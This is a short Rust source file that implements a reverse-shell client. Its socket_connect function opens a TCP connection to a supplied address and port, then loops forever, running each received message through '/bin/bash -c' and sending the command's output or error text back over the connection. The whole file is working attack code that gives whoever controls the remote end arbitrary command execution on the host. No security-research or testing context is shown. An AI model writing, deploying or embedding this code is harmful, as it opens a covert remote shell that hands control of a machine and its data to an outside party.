use std::net::TcpStream;
use std::io::{Read, Write};
use std::str;
use std::process::{Command, Output};

pub fn socket_connect(addr: &String, port: &String) {

    // connect to the socket
    let mut connection = TcpStream::connect(format!("{addr}:{port}")).unwrap();

    loop {
        // read
        let mut read_buf= [0u8; 1024];
        let bytes_read = connection.read(&mut read_buf).unwrap();
        let data = &read_buf[..bytes_read];

        // execute command
        if (data.len() == 1) && data[0] == 0 {
            connection.write("\0".as_bytes()).unwrap();
            connection.flush().unwrap();
        } else {
            let command = shell_execute_command(data);

            if command.status.success() == true { // ensure command success
                let raw = command.stdout;
                let output = str::from_utf8(&raw).unwrap();
        
                if output.len() > 0 {
                    connection.write(output.as_bytes()).unwrap();
                    connection.flush().unwrap();
                } else {
                    connection.write("\0".as_bytes()).unwrap();
                    connection.flush().unwrap();
                }
            } else { // catch command error
                let raw = command.stderr;
                let output = str::from_utf8(&raw).unwrap();
        
                if output.len() > 0 {
                    connection.write(output.as_bytes()).unwrap();
                    connection.flush().unwrap();
                } else {
                    connection.write("[UNKNOWN ERROR]".as_bytes()).unwrap();
                    connection.flush().unwrap();
                }
            }
        }
        
    }
}

fn shell_execute_command(data: &[u8]) -> Output {
    let command = Command::new("/bin/bash")
        .arg("-c")
        .arg(str::from_utf8(&data).unwrap())
        .output()
        .unwrap();

    return command;
}
